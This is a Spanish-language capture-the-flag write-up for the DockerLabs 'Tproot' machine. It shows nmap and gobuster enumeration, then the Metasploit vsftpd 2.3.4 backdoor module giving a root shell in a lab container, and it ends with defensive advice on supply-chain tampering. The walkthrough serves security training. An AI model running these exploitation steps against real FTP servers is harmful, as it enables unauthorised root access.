# Tproot — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🔵 Muy Fácil  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 10/02/2025  
**Técnicas:** Nmap · FTP anónimo (fallido) · Gobuster · searchsploit · Metasploit (vsftpd 2.3.4 backdoor)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración](#2-enumeración)
3. [Explotación — vsftpd 2.3.4 backdoor con Metasploit](#3-explotación--vsftpd-234-backdoor-con-metasploit)
4. [Lección aprendida](#4-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh tproot.tar
```

> IP asignada: `172.17.0.2`. Comprobamos conectividad:

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.053 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.038 ms
```

Escaneo inicial de puertos:

```bash
nmap -Pn 172.17.0.2
```

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

Escaneo profundo con versiones:

```bash
nmap -p21,80 -sCV -Pn 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

> 💡 **vsftpd 2.3.4** es una versión histórica con una backdoor famosa introducida maliciosamente en el código fuente en 2011. Es un clásico en CTFs.

---

## 2. Enumeración

Intentamos conectar al FTP como usuario `anonymous` — por defecto no necesita contraseña:

```bash
ftp 172.17.0.2
```

```
Name (172.17.0.2:caan31): anonymous
331 Please specify the password.
Password:
500 OOPS: cannot change directory:/var/ftp
ftp: Login failed.
```

El anónimo no funciona. La web tampoco tiene contenido relevante (página por defecto de Apache). Probamos Gobuster:

```bash
sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.17.0.2/" -x .php,.txt,.html
```

```
/.html     (Status: 403)
/index.html (Status: 200)
/.html     (Status: 403)
```

No hay nada útil en la web. El vector es el FTP. Buscamos exploits para la versión exacta:

```bash
searchsploit vsftpd 2.3.4
```

```
Exploit Title                                              | Path
vsftpd 2.3.4 - Backdoor Command Execution                  | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)     | unix/remote/17491.rb
```

Hay dos opciones: un script Python y un módulo de Metasploit. Usamos Metasploit.

---

## 3. Explotación — vsftpd 2.3.4 backdoor con Metasploit

Abrimos Metasploit:

```bash
msfconsole
```

Buscamos y cargamos el módulo:

```bash
msf6 > search vsftpd 2.3.4
```

```
#  Name                                    Disclosure Date  Rank
0  exploit/unix/ftp/vsftpd_234_backdoor    2011-07-03       excellent
```

```bash
msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

Revisamos qué necesita el exploit:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
```

```
Basic options:
  Name    Required  Description
  RHOSTS  yes       The target host
  RPORT   21        The target port (TCP)

Description:
  This module exploits a malicious backdoor that was added to the VSFTPD
  download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz
  archive between June 30th 2011 and July 1st 2011.
```

Configuramos el objetivo y ejecutamos:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
whoami
[*] Command shell session 1 opened (172.17.0.1:39903 -> 172.17.0.2:6200)
root
```

✅ Tenemos shell directa como **root**. El exploit activa la backdoor en el puerto 6200 automáticamente.

Exploramos el sistema para encontrar la flag:

```bash
cd /home
ls
# ubuntu
cd ubuntu
ls
cd /root
ls
# root.txt
cat root.txt
# 261fd3f32200f950f231816b4e9a0594
```

---

## 4. Lección aprendida

Esta máquina muestra uno de los ataques de cadena de suministro más famosos de la historia del software libre:

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **vsftpd 2.3.4 backdoor** | Puerto 21 FTP | Shell directa como root sin credenciales |

**¿Qué es una backdoor de supply chain?** En 2011, alguien comprometió el servidor de descargas de vsftpd e inyectó código malicioso en el tarball. Cualquier instalación de esa versión concreta tenía una puerta trasera: al enviar un usuario con `:)` al final, activaba un listener en el puerto 6200 con acceso root.

**Para defenderse:**
- Verificar siempre los hashes (MD5/SHA256) de los paquetes descargados.
- Mantener el software actualizado — vsftpd corrigió esto en versiones posteriores.
- Nunca exponer servicios FTP directamente a internet en producción.
- Usar SFTP en lugar de FTP (cifrado + sin estas vulnerabilidades históricas).

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
